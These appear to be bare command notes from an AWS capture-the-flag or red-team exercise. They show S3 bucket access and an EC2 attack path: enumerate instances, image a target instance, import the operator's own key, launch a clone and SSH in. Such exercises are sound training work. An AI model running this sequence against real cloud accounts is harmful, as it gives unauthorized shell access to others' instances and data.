```
aws s3 ls  s3://ctfbucket-374385855887
aws s3 cp file.txt s3://ctfbucket-374385855887/test.txt
http://s3.amazonaws.com/ctfbucket-374385855887

aws ec2 describe-instances
aws ec2 describe-instances --instance-ids i-01dae4002316c79e6
aws ec2 create-image --instance-id i-01dae4002316c79e6 --name "Deloitte_Red Team" --description "Deloitte Red Team"
aws ec2 import-key-pair --key-name "Deloitte" --public-key-material file://aws.pub
aws ec2 run-instances --image-id ami-069f61c4801753ffc --security-group-ids "sg-a5b42392" "sg-0ed973a145df7fa29" "sg-07144a98dc383a311" --count 1 --instance-type t2.micro --key-name Deloitte --query "Instances[0].InstanceId"
aws ec2 run-instances --image-id ami-069f61c4801753ffc --security-group-ids "sg-a5b42392" "sg-0ed973a145df7fa29" "sg-07144a98dc383a311" --subnet-id subnet-7aefab74 --count 1 --instance-type t2.micro --key-name Deloitte --query "Instances[0].InstanceId"
aws ec2 describe-instances --instance-ids i-01dae4002316c79e6 --query "Reservations[0].Instances[0].PublicIpAddress"
ssh -i aws_terraform ubuntu@3.238.62.143
```
